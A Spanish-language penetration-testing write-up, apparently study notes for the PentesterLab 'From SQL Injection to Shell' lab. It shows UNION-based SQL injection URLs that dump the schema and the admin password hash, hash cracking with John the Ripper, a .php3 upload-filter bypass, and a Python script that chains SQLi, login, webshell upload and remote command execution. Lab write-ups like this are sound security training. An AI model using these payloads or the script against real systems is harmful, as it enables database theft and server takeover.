# From SQL Injection to Shell

## How to:

1. Dar especial atención a recursos que no requieran autenticación
2. Localizar SQLi en el código
3. Comprobar si son explotables por un usuario externo 
4. URL: https://www.pentesterlab.com/exercises/from_sqli_to_shell/course

## Fase I: Information Gathering

1. **Obtención de cabeceras**

   

![Screenshot at Oct 12 23-34-43](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/Screenshot%20at%20Oct%2012%2023-34-43.png)

Resultados: 
-	Lenguaje: PHP/5.3.3-7
-	Sistema operativo: Debian Squeeze


2. **Enumeración de directorios**

![directorios](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/directorios.png)



Resultados:

- Código 200
  - /all
  - /cat
  - /index
  - show
- Especial atención:
  - /admin



## Fase 2: Analisis de código

1. Al tratarse de una web, la primera aproximación es ver si hay alguna inyección SQL

![](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/sql.png)



2. Se puede ver que en el fichero picture.php hay tres candidatos a sqli por que se esta concatenando el parámetro a la consulta:

![concatenacion](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/concatenacion.png)

3. Revisión del fichero pictures. Ahora lo que interesa es ver si es posible que los parámetros "id" o "cat" sean accesibles por el usuario y si hay alguna función de filtrado.

### Analisis del fichero pictures

#### Linea 17 - Función All

![funcion_all](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/funcion_all.png)

- Tiene un parámetro de entrada que es CAT
- No tiene función de filtrado

#### Linea 54 - Funcion Render

![funcion_render](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/funcion_render.png)

- Tiene un parámetro de entrada que es id
- Tiene una regla de filtrado, ya que se comprueba que el valor sea un integer
- Se descarta como debilidad

#### Linea 77 - Función Show 

![funcion_show](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/funcion_show.png)

- Tiene un parámetro de entrada, id
- No hay una función de filtrado

#### Resumen

Se seguirá el análisis de las funciones all y show, quedando descartada la función render por que incorporar una regla de filtrado

### Función All

![](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/funcion_all_llamada.png)

1. El fichero /admin/index.php queda fuera del scope por que se necesitara autenticación

2. El candidato es:

   */cat.php*

   El valor de "id" es transferido en una petición GET

   En el punto 2 de information gathering se ha visto que no es necesario autenticarse

#### Comprobación

1. La configuración es:

   ![configuracion_get_all](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/configuracion_get_all.png)

2. Resultado:

   ![respuesta_get_all](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/respuesta_get_all.png)

3. Intento de explotación de la vulnerabilidad:

      ![configuracion_get_all_sql](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/configuracion_get_all_sql.png)

4. Resultado:

   ​		![resultado_configuracion_get_all_sql](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/resultado_configuracion_get_all_sql.png)

   La debilidad detectada en el código es accesible y explotada. Hay vulnerabilidad.

### Función Show

1. Al intentar explotar la función show no se ha obtenido ningún tipo de comentario o de error al intentar realizar una sql injection. Por facilidad, se opta por seguir con la explotación del sql injection en el fichero cat



## Fase 3: Explotación de la SQLi

1. Identificación del gestor de la Database

   - En el erro SQL obtenido anteriormente se informa que es Msyql

2. Número de columnas

   - http://172.16.113.157/cat.php?id=2+ORDER+BY+5

     ![columnas_5](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/columnas_5.png)

   - http://172.16.113.157/cat.php?id=2+ORDER+BY+4

     ![columnas_4](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/columnas_4.png)

   - Hay 4 columnas

3. Identificación de los tipos de datos de las columnas

   - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2CNULL%2CNULL%2C%27A%27

4. Identificación de la versión

   - http://172.16.113.157/cat.php?id=2+UNION+SELECT+VERSION%28%29%2C%40%40VERSION%2CNULL%2CNULL

   ![version](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/version.png)

5. Usuario de ejecución

   - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2CUSER%28%29%2CNULL%2CNULL

   ![](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/user.png)

6. Información database

   - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cschema_name%2CNULL%2CNULL+FROM+information_schema.schemata

   ![database](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/database.png)

7. Tablas de photoblog

      - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Ctable_name%2CNULL%2CNULL+FROM+information_schema.tables+WHERE+table_schema%3D%27photoblog%27

        ![tablas](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/tablas.png)

8. Columnas

      - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cconcat_ws(%27+:+%27+%2Ctable_name%2Ccolumn_name)%2CNULL%2CNULL+FROM+information_schema.columns+WHERE+table_schema%3D%27photoblog%27+AND+table_name%3D%27users%27

      ![columnas](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/columnas.png)

9. Datos de user:password

      - http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cconcat_ws(%27+:+%27+%2Cid%2Clogin%2Cpassword)%2CNULL%2CNULL+FROM+photoblog.users

      ![admin](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/admin.png)

10. Privilegios

	- http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cconcat_ws%28%27%7C+%27%2Cgrantee%2Ctable_schema%2Cprivilege_type%29%2CNULL%2CNULL+FROM+information_schema.schema_privileges
	- http://172.16.113.157/cat.php?id=2+UNION+SELECT+NULL%2Cconcat_ws%28%27%7C+%27%2Cgrantee%2Cprivilege_type%29%2CNULL%2CNULL+FROM+information_schema.user_privileges+WHERE+grantee+like+%27%25pentester%25%27
      

![](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/privilegios.png)

## Fase 4: Descifrado del password del usuario admin

1. Credenciales del admin: 
   - admin | 8efe310f9ab3efeae8d410a8e0166eb2
2. Usando google
3. Identificación con Hash-identifier

![hash_identifier](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/hash_identifier.png)

4. Identificación mediante el código.

   1. En el fichero /admin/login:

      ![login](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/login.png)

      

   2. En el fichero /admin/index:

         ![clases_login](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/clases_login.png)

   3. En el fichero clases/auth

         ![clases_auth](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/clases_auth.png)

      

   4. Finalmente, en el fichero /clases/user:

         ​	![md5login](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/md5login.png)

   5. Otra opción hubiera sido probar un login en la aplicación y luego revisar el código:

![params_login](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/params_login.png)

 
![params_login_grep](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/params_login_grep.png)

4. John 

   - john --list=formats | tr , '\n' | grep -i md5
   - john --format=raw-md5 password_photoblog --wordlist=/usr/share/wordlists/rockyou.txt --rules

   ![john](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/john.png)



## Fase 5 - File upload y webshell

1. Una vez que se puede autenticarse como admin se analizan las diferentes funcionalidades y el código. En concreto se opta por analizar el file upload, presente en el fichero new:

   ![new_index](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/new_index.png)

2. Tal y como se indica en el código, es el fichero /admin/index mediante la función create la que se encarga de esta funcionalidad:

   ![picturea_create_index](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/picturea_create_index.png)

3. Mediante burp se revisan que parámetros son necesarios para llevar a cabo la subida del fichero:

![burp_new](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/burp_new.png)

4. El analisis de la función create( en classes/picture) aporta la siguiente información:

   1. El fichero esta ubicado en el directorio "uploads/"
   2. Hay un filtrado de extensiones que no permite utilizar la extensión php pero si, por 				ejemplo, php3
   3. Sabiendo esto, el siguiente paso es subir una webshell

   ![funcion_create](https://github.com/Nyanyi/Awae/blob/main/exercices/sqli_to_shell/images/funcion_create.png)

## Fase 6: Automatización

```python
import requests

target="172.16.113.157"
path_file="/home/nyanyi/awae/preparacion/sqli_to_shell/solucion/console.php3"
command='uname -a'

def sqli(target):
    path_sqli="/cat.php"
    url = "http://" + target + path_sqli
    payload = {'id':"2 UNION SELECT NULL,concat_ws(' : ' ,id,login,password),NULL,NULL FROM photoblog.users"}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)

def login(target):
    path="/admin/index.php"
    url="http://" + target + path
    payload={'user':'admin', 'password':'P4ssw0rd'}
    r=requests.post(url, data=payload, verify=False)
    print(r.status_code)
    return(r.cookies['PHPSESSID'])

def file_upload(target,idcookies):
    path="/admin/index.php"
    url = "http://" + target + path
    payload = {'title':"hpl", 'category':'1', 'Add':'Add'}
    files={'image':('lovecraft.php3',open(path_file,'rb'),'application/x-php')}
    cookies=dict(PHPSESSID=idcookies)
    r= requests.post(url, files=files, data=payload, cookies=cookies, verify=False)

def remote_console(target,command):
    path="/admin/uploads/lovecraft"
    url = "http://" + target + path
    payload = {'cmd':command}
    r=requests.get(url, params=payload, verify=False)
    print(r.text)

def main():
    sqli(target)
    idcookies=login(target)
    file_upload(target,idcookies)
    remote_console(target, command)
	
#start

if __name__=="__main__":
    main()

```

